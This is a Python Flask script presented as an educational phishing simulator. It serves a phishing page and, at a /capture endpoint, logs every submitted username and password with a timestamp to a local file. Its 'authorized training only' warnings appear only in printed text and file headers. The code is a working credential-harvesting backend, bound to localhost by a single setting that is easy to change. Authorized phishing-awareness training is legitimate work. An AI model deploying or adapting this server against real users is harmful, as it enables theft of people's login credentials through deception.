# phishing_server.py (Educational Use Only)
from flask import Flask, request, jsonify
import datetime

app = Flask(__name__)
CREDENTIALS_FILE = 'captured_credentials.txt'

def save_credentials(data):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    entry = f"[{timestamp}] Username: {data['username']} | Password: {data['password']}\n"
    
    with open(CREDENTIALS_FILE, 'a') as f:
        f.write(entry)
        f.write("--- Simulation Entry - Not Real Credentials ---\n\n")

@app.route('/')
def index():
    return open('phishing_simulator.html').read()

@app.route('/capture', methods=['POST'])
def capture():
    try:
        data = request.get_json()
        save_credentials(data)
        return jsonify({"message": "Simulation data recorded"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    print("""
    EDUCATIONAL PHISHING SIMULATOR
    ------------------------------
    WARNING: For authorized training only.
    Captured data will be saved to: captured_credentials.txt
    """)
    
    # Initialize empty file with header
    with open(CREDENTIALS_FILE, 'w') as f:
        f.write("PHISHING SIMULATION CAPTURES\n")
        f.write("DO NOT STORE REAL CREDENTIALS\n")
        f.write("=============================\n\n")
    
    app.run(host='127.0.0.1', port=5000)